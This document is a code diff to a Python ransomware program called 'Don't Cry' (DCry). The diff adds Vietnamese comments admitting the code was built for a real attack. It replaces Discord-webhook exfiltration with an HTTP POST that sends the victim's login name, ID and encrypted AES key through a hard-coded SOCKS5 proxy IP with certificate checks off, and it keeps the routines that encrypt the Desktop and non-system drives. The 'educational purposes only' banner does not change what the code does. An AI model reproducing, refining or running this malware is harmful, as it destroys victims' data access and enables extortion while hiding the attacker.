@@ -2,6 +2,9 @@
 #                             Don't Cry Ransomware                             #
 #                          ! EDUCATIONAL PURPOSES ONLY !                       #
 ################################################################################
+# Lưu ý: đây là mã độc DCry, được phát triển để thực hiện một cuộc tấn công thực thụ vào một hệ thống máy chủ.
+# Vì vậy, Mã độc này có thể gây ra thiệt hại nghiêm trọng cho hệ thống và dữ liệu của bạn.
+# Nên hãy sử dụng mã này một cách cẩn thận và chỉ được sử dụng trong các cuộc tấn công mạng giả lập nâng cao dưới sự giám sát của ít nhất một chuyên gia về an ninh mạng.
 
 import os
 import sys
@@ -23,11 +26,9 @@ import winshell
 from Crypto.Cipher import AES # hidden import
 from win32com.client import Dispatch
 from file_crypto import encrypt_file # type: ignore
-from discord_webhook import DiscordEmbed, DiscordWebhook
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import PKCS1_OAEP
-
-YOUR_WEBHOOK_URL = ""
+YOUR_URL = "" # with open("url", "r") as f: YOUR_URL = f.read()
 id = ""
 
 RSA_PUBLIC_KEY = """-----BEGIN RSA PUBLIC KEY-----
@@ -315,24 +316,28 @@ def encrypt_key(aes_key):
 
 def start_encryption():
     global id
-    webhook = DiscordWebhook(url=YOUR_WEBHOOK_URL)
     id = uuid.uuid1()
     key = get_random_bytes(16)
     key_b64 = base64.urlsafe_b64encode(b"DCRY+DKEY$" + key).decode()
     encrypted_key = encrypt_key(key_b64.encode())
-    with open(os.path.join(os.environ["TEMP"], "key.bin"), "wb") as f:
-        f.write(encrypted_key)
-    with open(os.path.join(os.environ["TEMP"], "key.bin"), "rb") as f:
-        webhook.add_file(file=f.read(), filename=f'key_{id}.bin')
-    with open(os.path.join(os.environ["TEMP"], "key.bin"), "wb") as f:
-        f.write(os.urandom(os.path.getsize(os.path.join(os.environ["TEMP"], "key.bin"))))
-    os.remove(os.path.join(os.environ["TEMP"], "key.bin"))
-    embed = DiscordEmbed(
-        title=f"Username: {os.getlogin()} | ID: {id} | Date: {datetime.now().strftime('%d-%m-%Y')}",
-        description=f"Key: {encrypted_key}",
-    )
-    webhook.add_embed(embed)
-    webhook.execute()
+    
+    data = {
+        'username': os.getlogin(),
+        'id': str(id),
+        'date': datetime.now().strftime('%d-%m-%Y'),
+        'key': base64.b64encode(encrypted_key).decode()
+    }
+    
+    proxies = {
+        'http': 'socks5h://103.249.200.254:1185',
+        'https': 'socks5h://103.249.200.254:1185'
+    }
+
+    try:
+        requests.post(YOUR_URL, data=data, proxies=proxies, verify=False, timeout=10)
+    except requests.exceptions.RequestException as e:
+        print(f"Error sending data: {e}")
+
     with open(os.path.join(f"C:\\Users\\{getpass.getuser()}", "key.sha256"), "wb") as f:
         f.write(hashlib.sha256(key).hexdigest().encode())
     encrypt_directory(os.path.join(f"C:\\Users\\{getpass.getuser()}", "Desktop"), key)
@@ -348,6 +353,7 @@ def start_encryption():
     ]:
         if disk[:2] != os.getenv("SystemDrive") and disk[:2] != os.getenv("HOMEDRIVE"):
             encrypt_directory(disk, key)
+    del key, key_b64, encrypted_key
 
 
 def encrypt_directory(directory_path, key):
